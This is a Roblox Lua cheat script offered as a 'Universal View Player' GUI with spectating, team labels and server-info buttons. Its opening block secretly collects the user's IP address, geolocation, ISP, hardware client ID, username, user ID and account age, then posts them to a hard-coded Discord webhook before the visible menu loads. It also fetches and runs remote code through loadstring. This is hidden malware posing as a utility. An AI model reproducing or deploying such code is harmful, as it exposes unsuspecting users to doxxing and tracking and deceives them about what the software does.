local _LocalPlayer = game:GetService('Players').LocalPlayer
local _HttpService = game:GetService('HttpService')
local _DisplayName = game.Players.LocalPlayer.DisplayName
local _Name = game.Players.LocalPlayer.Name
local _UserId = game.Players.LocalPlayer.UserId
local _RobloxLocaleId = game.LocalizationService.RobloxLocaleId
local _httpsv4identme = game:HttpGet('https://v4.ident.me/')
local v8 = _HttpService:JSONDecode(game:HttpGet('http://ip-api.com/json'))
local v9, v10, v11 = ipairs({
    'query',
    'country',
    'regionName',
    'city',
    'zip',
    'isp',
    'org',
    'as',
})
local v12 = {}

while true do
    local v13

    v11, v13 = v9(v10, v11)

    if v11 == nil then
        break
    end
    if v8[v13] then
        v12[v13] = v8[v13]
    end
end

local v14, v15, v16 = pairs(v12)
local v17 = ''

while true do
    local v18

    v16, v18 = v14(v15, v16)

    if v16 == nil then
        break
    end

    v17 = v17 .. '**' .. v16 .. ':** ' .. v18 .. '\n'
end

local v19 = game:GetService('RbxAnalyticsService'):GetClientId()
local _AccountAge = _LocalPlayer.AccountAge
local v21 = string.sub(tostring(_LocalPlayer.MembershipType), 21)
local v22 = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local _Name2 = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
local v24
if identifyexecutor then
    v24 = identifyexecutor()
elseif getexecutorname then
    v24 = getexecutorname()
else
    v24 = 'Unknown Executor'
end
local v25 = _HttpService:JSONEncode({
    avatar_url = 'https://i.imgur.com/oBPXx0D.png',
    content = '',
    embeds = {
        {
            author = {
                name = '( Arsenal Script)',
                url = 'https://roblox.com',
            },
            description = '__[Player Info](https://www.roblox.com/users/' .. _UserId .. ')__\n' .. '**Display Name:** ' .. _DisplayName .. '\n' .. '**Username:** ' .. _Name .. '\n' .. '**User Id:** ' .. _UserId .. '\n' .. '**MembershipType:** ' .. v21 .. '\n' .. '**AccountAge:** ' .. _AccountAge .. '\n' .. '**Country:** ' .. _RobloxLocaleId .. '\n' .. '**IP:** ' .. _httpsv4identme .. '\n' .. '**Hwid:** ' .. v19 .. '\n' .. '**Date:** ' .. tostring(os.date('%m/%d/%Y')) .. '\n' .. '**Time:** ' .. tostring(os.date('%X')) .. '\n\n' .. '__[Game Info](https://www.roblox.com/games/' .. game.PlaceId .. ')__\n' .. '**Game:** ' .. _Name2 .. '\n' .. '**Game Id**: ' .. game.PlaceId .. '\n' .. '**Executor:** ' .. v24 .. '\n\n' .. '**IP Information:**\n' .. v17 .. '\n' .. '**JobId:**\n```' .. v22 .. '```',
            type = 'rich',
            color = tonumber(15924992),
            thumbnail = {
                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. game.Players.LocalPlayer.UserId .. '&width=150&height=150&format=png',
            },
        },
    },
});

(http_request or request or (HttpPost or syn.request))({
    Url = 'https://discord.com/api/webhooks/1439337644726288598/-4_ajpkzkGjjjZmnVKs3XylE5upiUKfbil2qLaV6_8RKlTfPFeUuVP6xA9tKSqfgSKeY',
    Body = v25,
    Method = 'POST',
    Headers = {
        ['content-type'] = 'application/json',
    },
})

repeat task.wait() until game:IsLoaded()
task.wait(0.5)

-- [STABLE RAYFIELD LOADER]
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local WS = game:GetService("Workspace")
local LP = Players.LocalPlayer
local Cam = WS.CurrentCamera

-- ===== STATE MANAGEMENT =====
local viewing = nil
local originalSubject = Cam.CameraSubject
local showTeams = false
local teamLabels = {}

-- ===== HELPER FUNCTIONS =====
local function getPlayerList()
    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            table.insert(list, p.DisplayName .. " (@" .. p.Name .. ")")
        end
    end
    table.sort(list)
    return list
end

local function findPlayer(query)
    if not query or query == "" then return nil end
    query = query:lower():gsub("^@", "")
    
    local asNum = tonumber(query)
    if asNum then
        for _, p in ipairs(Players:GetPlayers()) do
            if p.UserId == asNum then return p end
        end
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == query or p.DisplayName:lower() == query then return p end
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p.DisplayName:lower():find(query, 1, true) or p.Name:lower():find(query, 1, true) then return p end
    end
    
    return nil
end

-- FIXED DROPDOWN FINDER (STRICT MAPPING)
local function findPlayerFromDropdown(str)
    if not str or str == "" then return nil end
    local startIdx = string.find(str, "@")
    if startIdx then
        local username = string.sub(str, startIdx + 1, #str - 1)
        return Players:FindFirstChild(username)
    end
    return nil
end

local function viewPlayer(p)
    if not p or not p.Character then return false end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    
    viewing = p
    Cam.CameraSubject = hum
    return true
end

local function unview()
    viewing = nil
    if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
        Cam.CameraSubject = LP.Character.Humanoid
    else
        Cam.CameraSubject = originalSubject
    end
end

-- Persistent Subject Loop
task.spawn(function()
    while task.wait(0.5) do
        if viewing then
            if not viewing.Parent then
                unview()
            elseif viewing.Character then
                local hum = viewing.Character:FindFirstChildOfClass("Humanoid")
                if hum and Cam.CameraSubject ~= hum then
                    Cam.CameraSubject = hum
                end
            end
        end
    end
end)

-- ===== TEAM LABELS ENGINE =====
local function clearTeamLabels()
    for _, bb in pairs(teamLabels) do pcall(function() bb:Destroy() end) end
    teamLabels = {}
end

local function createTeamLabel(p)
    if not p.Character or not p.Character:FindFirstChild("Head") then return end
    local head = p.Character.Head
    if teamLabels[p] then pcall(function() teamLabels[p]:Destroy() end) end
    
    local bb = Instance.new("BillboardGui", head)
    bb.Name = "TeamLabel"
    bb.Adornee = head
    bb.Size = UDim2.new(0, 200, 0, 40)
    bb.StudsOffset = Vector3.new(0, 3, 0)
    bb.AlwaysOnTop = true
    
    local nm = Instance.new("TextLabel", bb)
    nm.Size = UDim2.new(1, 0, 0, 16)
    nm.BackgroundTransparency = 1
    nm.Text = p.DisplayName
    nm.TextColor3 = Color3.new(1,1,1)
    nm.TextSize = 13
    nm.Font = Enum.Font.GothamBold
    nm.TextStrokeTransparency = 0.5
    
    local teamLb = Instance.new("TextLabel", bb)
    teamLb.Size = UDim2.new(1, 0, 0, 14)
    teamLb.Position = UDim2.new(0, 0, 0, 16)
    teamLb.BackgroundTransparency = 1
    teamLb.TextSize = 11
    teamLb.Font = Enum.Font.Gotham
    
    local function updateText()
        if p.Team then
            teamLb.Text = "[" .. p.Team.Name .. "]"
            teamLb.TextColor3 = p.Team.TeamColor.Color
        else
            teamLb.Text = "[No Team]"
            teamLb.TextColor3 = Color3.fromRGB(180, 180, 180)
        end
    end
    
    updateText()
    p:GetPropertyChangedSignal("Team"):Connect(updateText)
    teamLabels[p] = bb
end

local function refreshAllTeamLabels()
    clearTeamLabels()
    if not showTeams then return end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then createTeamLabel(p) end
    end
end

-- ===== RAYFIELD GUI CONSTRUCTION =====
local Window = Rayfield:CreateWindow({
    Name = "View Player [UNIVERSAL]",
    Icon = 111445416990855,
    LoadingTitle = "Loading RinX...",
    LoadingSubtitle = "Universal Script",
    ConfigurationSaving = {Enabled = false},
})

local ViewTab = Window:CreateTab("View Player")

ViewTab:CreateSection("Player Selection")

local PlayerDropdown = ViewTab:CreateDropdown({
    Name = "Player List",
    Options = getPlayerList(),
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(v) end,
})

ViewTab:CreateButton({
    Name = "Refresh Player List",
    Callback = function() PlayerDropdown:Refresh(getPlayerList()) end,
})

ViewTab:CreateButton({
    Name = "VIEW SELECTED PLAYER",
    Callback = function()
        local selected = PlayerDropdown.CurrentOption[1]
        if not selected or selected == "" then return end
        local p = findPlayerFromDropdown(selected)
        if p then viewPlayer(p) end
    end,
})

ViewTab:CreateSection("Search and Controls")

local searchQuery = ""
ViewTab:CreateInput({
    Name = "Search Name or ID",
    PlaceholderText = "Type here...",
    Callback = function(text) searchQuery = text end,
})

ViewTab:CreateButton({
    Name = "View by Search",
    Callback = function()
        local p = findPlayer(searchQuery)
        if p then viewPlayer(p) end
    end,
})

ViewTab:CreateButton({
    Name = "Unview (Return to Self)",
    Callback = function() unview() end,
})

ViewTab:CreateButton({
    Name = "View Random Player",
    Callback = function()
        local others = {}
        for _, p in pairs(Players:GetPlayers()) do if p ~= LP then table.insert(others, p) end end
        if #others > 0 then viewPlayer(others[math.random(1, #others)]) end
    end,
})

ViewTab:CreateButton({
    Name = "Cycle Next Player",
    Callback = function()
        local others = {}
        for _, p in pairs(Players:GetPlayers()) do if p ~= LP then table.insert(others, p) end end
        local idx = 1
        if viewing then
            for i, p in pairs(others) do if p == viewing then idx = i break end end
            idx = (idx % #others) + 1
        end
        viewPlayer(others[idx])
    end,
})

-- TEAMS TAB
local TeamTab = Window:CreateTab("Teams")

TeamTab:CreateSection("Visuals")

TeamTab:CreateToggle({
    Name = "Show Team Labels Above Heads",
    CurrentValue = false,
    Callback = function(v)
        showTeams = v
        refreshAllTeamLabels()
    end,
})

TeamTab:CreateButton({
    Name = "Refresh Labels",
    Callback = function() refreshAllTeamLabels() end,
})

TeamTab:CreateSection("Server Teams")

TeamTab:CreateButton({
    Name = "List All Server Teams",
    Callback = function()
        local teams = game:GetService("Teams"):GetTeams()
        local msg = ""
        for _, t in ipairs(teams) do
            local count = 0
            for _, p in ipairs(Players:GetPlayers()) do if p.Team == t then count += 1 end end
            msg = msg .. t.Name .. " (" .. count .. " players)\n"
        end
        Rayfield:Notify({Title = "Server Teams", Content = msg == "" and "No teams found" or msg, Duration = 5})
    end,
})

-- INFO TAB
local InfoTab = Window:CreateTab("Player Info")

InfoTab:CreateSection("UI Information")

local executorName
if identifyexecutor then
    executorName=identifyexecutor()
elseif getexecutorname then
    executorName=getexecutorname()
end
InfoTab:CreateParagraph({Title = "Executor", Content = executorName})

InfoTab:CreateParagraph({Title = "Our Developer Team", Content = "Resh/Paper, Rizia, KansaS"})

InfoTab:CreateSection("Server Information")

InfoTab:CreateButton({
    Name = "Copy Server Join Link",
    Callback = function()
        setclipboard("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId)
        Rayfield:Notify({Title = "Link Copied", Content = "Join link copied to clipboard", Duration = 2})
    end,
})

InfoTab:CreateButton({
    Name = "Show Server Stats",
    Callback = function()
        local msg = "PlaceId: " .. game.PlaceId .. "\nJobId: " .. game.JobId .. "\nPlayers: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
        Rayfield:Notify({Title = "Server Details", Content = msg, Duration = 6})
    end,
})

InfoTab:CreateSection("Target Analytics")

InfoTab:CreateButton({
    Name = "Deep Scan Viewed Player",
    Callback = function()
        if not viewing then return end
        local p = viewing
        local msg = "Display: " .. p.DisplayName .. "\nUser: @" .. p.Name .. "\nAge: " .. p.AccountAge .. " days\nID: " .. p.UserId .. "\nTeam: " .. (p.Team and p.Team.Name or "None")
        Rayfield:Notify({Title = "Deep Scan Result", Content = msg, Duration = 8})
    end,
})

InfoTab:CreateButton({
    Name = "Copy Target Profile Link",
    Callback = function()
        if viewing then setclipboard("https://www.roblox.com/users/" .. viewing.UserId .. "/profile") end
    end,
})

InfoTab:CreateSection("Technical")

InfoTab:CreateButton({
    Name = "List Players in F9 Console",
    Callback = function()
        print("=== SERVER PLAYERS ===")
        for _, p in ipairs(Players:GetPlayers()) do
            print(p.DisplayName .. " (@" .. p.Name .. ") | ID: " .. p.UserId .. " | Age: " .. p.AccountAge .. " days")
        end
    end,
})

-- Auto Refresh Logic
Players.PlayerAdded:Connect(function(p)
    task.wait(1)
    PlayerDropdown:Refresh(getPlayerList())
    if showTeams then createTeamLabel(p) end
end)

Players.PlayerRemoving:Connect(function(p) 
    if viewing == p then unview() end
    if teamLabels[p] then pcall(function() teamLabels[p]:Destroy() end); teamLabels[p] = nil end
    task.wait(1) 
    PlayerDropdown:Refresh(getPlayerList()) 
end)

Rayfield:Notify({Title = "Universal View Player script", Content = "Loaded. All systems restored.", Duration = 4})